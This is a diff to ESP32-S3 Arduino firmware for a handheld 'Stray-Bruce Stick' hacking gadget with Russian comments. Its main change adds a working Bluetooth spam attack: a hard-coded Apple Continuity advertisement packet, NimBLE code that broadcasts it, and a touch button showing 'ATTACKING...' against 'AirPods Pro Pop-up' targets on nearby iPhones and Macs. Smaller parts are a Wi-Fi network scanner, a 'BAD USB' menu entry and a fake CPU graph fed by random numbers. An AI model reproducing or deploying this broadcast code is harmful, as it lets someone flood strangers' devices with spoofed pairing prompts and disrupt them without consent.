@@ -3,8 +3,9 @@
 #include <Wire.h>
 #include <Adafruit_FT6206.h>
 #include <WiFi.h>
+#include <NimBLEDevice.h> // Установи NimBLE-Arduino!
 
-// --- КОНФИГУРАЦИЯ ПИНОВ (Твоя база) ---
+// --- КОНФИГУРАЦИЯ ПИНОВ (Stray-Bruce Stick) ---
 #define TFT_CS 42
 #define TFT_DC 40
 #define TFT_RST 41
@@ -16,20 +17,30 @@
 Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_MOSI, TFT_SCLK, TFT_RST);
 Adafruit_FT6206 ts = Adafruit_FT6206();
 
-// Глобальные переменные
+// Глобальные переменные состояния
 int current = 0;
 int state = 0; // 0-Main, 1-App
 const char* menu[] = {"WIFI", "BLUETOOTH", "IR REMOTE", "BAD USB", "SYSTEM"};
 
-// Переменные для графика (Осциллограф)
+// Переменные для Bluetooth Spam
+bool isSpamming = false;
+NimBLEAdvertising *pAdvertising;
+uint8_t apple_packet[] = {
+  0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 
+  0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 
+  0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 
+  0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
+};
+
+// Переменные для системного графика
 int graphX = 11;
 int lastY = 180;
 unsigned long lastGraphUpdate = 0;
 
 void setup() {
   tft.begin();
-  tft.setRotation(1); // ГОРИЗОНТАЛЬНО (320x240)
-  Wire.begin(2, 1);   // Твои пины I2C для тача
+  tft.setRotation(1); 
+  Wire.begin(2, 1); 
   ts.begin(40);
   
   WiFi.mode(WIFI_STA);
@@ -38,9 +49,28 @@ void setup() {
   drawMain();
 }
 
-// --- ГЛАВНОЕ МЕНЮ ---
+// --- ФУНКЦИИ BLUETOOTH SPAM ---
+void startSpam() {
+  NimBLEDevice::init("Stray-Bruce");
+  pAdvertising = NimBLEDevice::getAdvertising();
+  NimBLEAdvertisementData advertData;
+  advertData.addData(std::string((char*)apple_packet, sizeof(apple_packet)));
+  pAdvertising->setAdvertisementData(advertData);
+  pAdvertising->start();
+  isSpamming = true;
+}
+
+void stopSpam() {
+  if (pAdvertising) pAdvertising->stop();
+  NimBLEDevice::deinit(true);
+  isSpamming = false;
+}
+
+// --- ОТРИСОВКА ИНТЕРФЕЙСОВ ---
+
 void drawMain() {
   state = 0; 
+  if (isSpamming) stopSpam(); // Выключаем спам при выходе в меню
   tft.fillScreen(ILI9341_BLACK);
   tft.fillRect(0, 0, 320, 35, STRAY_YELLOW);
   tft.setTextColor(ILI9341_BLACK); tft.setTextSize(2);
@@ -49,7 +79,6 @@ void drawMain() {
   tft.drawRect(60, 80, 200, 80, STRAY_YELLOW); 
   drawMainText();
   
-  // Стрелки
   tft.fillTriangle(15, 120, 45, 90, 45, 150, STRAY_YELLOW);   
   tft.fillTriangle(305, 120, 275, 90, 275, 150, STRAY_YELLOW); 
 }
@@ -62,19 +91,14 @@ void drawMainText() {
   tft.print(menu[current]);
 }
 
-// --- ПРИЛОЖЕНИЯ ---
-
 void runScanner() {
   state = 1; tft.fillScreen(ILI9341_BLACK);
   drawExitButton();
   tft.setCursor(10, 50); tft.setTextColor(STRAY_YELLOW); tft.setTextSize(1);
-  tft.println("SCANNING WIFI AIRWAVES...");
-  
+  tft.println("SCANNING WIFI...");
   int n = WiFi.scanNetworks();
   if (n == 0) tft.println("No networks found.");
   else {
-    tft.println("Found: " + String(n));
-    tft.println("-------------------------");
     for (int i = 0; i < n && i < 8; i++) {
       tft.setTextColor(STRAY_YELLOW); tft.print(i+1); tft.print(": ");
       tft.setTextColor(ILI9341_WHITE); tft.println(WiFi.SSID(i));
@@ -90,52 +114,38 @@ void runBTSpam() {
   tft.drawFastHLine(0, 35, 320, STRAY_ORANGE);
   
   tft.setTextSize(1);
-  tft.setCursor(10, 50); tft.println("STATUS: READY TO ATTACK");
-  tft.setCursor(10, 70); tft.println("TARGET: iOS / MacOS DEVICES");
+  tft.setCursor(10, 50); tft.print("STATUS: ");
+  if (isSpamming) { tft.setTextColor(ILI9341_GREEN); tft.println("ATTACKING..."); }
+  else { tft.setTextColor(ILI9341_RED); tft.println("READY"); }
   
-  // Радар
-  tft.drawCircle(160, 150, 50, STRAY_ORANGE);
-  tft.drawCircle(160, 150, 30, STRAY_ORANGE);
-  tft.fillCircle(160, 150, 5, ILI9341_RED);
+  tft.setTextColor(STRAY_ORANGE);
+  tft.drawRect(80, 100, 160, 80, STRAY_ORANGE);
+  tft.setCursor(120, 135); tft.setTextSize(2);
+  tft.print(isSpamming ? "STOP" : "START");
   
-  tft.setTextColor(STRAY_YELLOW);
-  tft.setCursor(70, 220); tft.println("HOLD CENTER TO ATTACK");
+  tft.setTextSize(1);
+  tft.setCursor(75, 210); tft.println("Target: AirPods Pro Pop-up");
 }
 
 void runSystemInfo() {
   state = 1; tft.fillScreen(ILI9341_BLACK);
   drawExitButton();
-  
   tft.setTextColor(STRAY_YELLOW); tft.setTextSize(2);
   tft.setCursor(10, 10); tft.println("SYSTEM STATUS:");
   tft.drawFastHLine(0, 35, 320, STRAY_YELLOW);
-  
   tft.setTextSize(1);
-  tft.setCursor(10, 45); tft.print("USER: STRAY_2025");
-  tft.setCursor(10, 65); tft.print("CHIP: ESP32-S3 N16R8");
-  tft.setCursor(10, 85); tft.print("BDAY: APRIL 20");
-  tft.setCursor(10, 105); tft.print("SPEED: 100% TURBO");
-  
-  // Рамка осциллографа
+  tft.setCursor(10, 45); tft.print("USER: STRAY_2025 (10y)");
+  tft.setCursor(10, 65); tft.print("CHIP: S3 N16R8 | BDAY: APR 20");
   tft.drawRect(10, 130, 300, 80, STRAY_YELLOW);
-  tft.setCursor(15, 120); tft.print("CPU LOAD OSCILLOSCOPE");
   graphX = 11;
-  
-  tft.setTextColor(ILI9341_GREEN);
-  tft.setCursor(10, 220); tft.println("STRAY-BRUCE OS v8.0 ONLINE");
 }
 
 void updateGraph() {
-  if (millis() - lastGraphUpdate > 50) { // Обновляем каждые 50мс
-    if (graphX > 305) { 
-      tft.fillRect(11, 131, 298, 78, ILI9341_BLACK);
-      graphX = 11;
-    }
-    int val = random(140, 205); // Эмуляция данных
+  if (millis() - lastGraphUpdate > 50) {
+    if (graphX > 305) { tft.fillRect(11, 131, 298, 78, ILI9341_BLACK); graphX = 11; }
+    int val = random(140, 205);
     tft.drawLine(graphX, lastY, graphX + 2, val, ILI9341_GREEN);
-    lastY = val;
-    graphX += 2;
-    lastGraphUpdate = millis();
+    lastY = val; graphX += 2; lastGraphUpdate = millis();
   }
 }
 
@@ -145,42 +155,30 @@ void drawExitButton() {
   tft.setCursor(292, 10); tft.print("X");
 }
 
-// --- ОСНОВНОЙ ЦИКЛ ---
+// --- ЦИКЛ LOOP ---
 void loop() {
   if (ts.touched()) {
     TS_Point p = ts.getPoint();
     int y = map(p.x, 0, 240, 0, 240);
     int x = map(p.y, 0, 320, 0, 320);
 
-    if (state == 0) { // Навигация в меню
-      if (x < 60) { 
-        current = (current > 0) ? current - 1 : 4; 
-        drawMainText(); delay(250); 
-      }
-      else if (x > 260) { 
-        current = (current + 1) % 5; 
-        drawMainText(); delay(250); 
-      }
+    if (state == 0) { // Меню
+      if (x < 60) { current = (current > 0) ? current - 1 : 4; drawMainText(); delay(250); }
+      else if (x > 260) { current = (current + 1) % 5; drawMainText(); delay(250); }
       else if (x > 60 && x < 260 && y > 80 && y < 160) { 
         if (current == 0) runScanner(); 
         else if (current == 1) runBTSpam();
         else if (current == 4) runSystemInfo();
-        else {
-          tft.fillScreen(ILI9341_BLACK);
-          tft.setCursor(100, 110); tft.setTextColor(STRAY_YELLOW); tft.print("NOT READY");
-          delay(800); drawMain();
-        }
         delay(300); 
       }
     } 
-    else if (state == 1 && x > 270 && y < 45) { // Выход [X]
-      drawMain();
-      delay(300);
+    else if (state == 1) {
+      if (x > 270 && y < 45) { drawMain(); delay(300); } // Выход
+      if (current == 1 && x > 80 && x < 240 && y > 100 && y < 180) { // Кнопка START/STOP
+        if (!isSpamming) startSpam(); else stopSpam();
+        runBTSpam(); delay(400);
+      }
     }
   }
-
-  // Работа фоновых процессов приложений
-  if (state == 1 && current == 4) {
-    updateGraph(); // Рисуем график только в систем инфо
-  }
+  if (state == 1 && current == 4) updateGraph();
 }
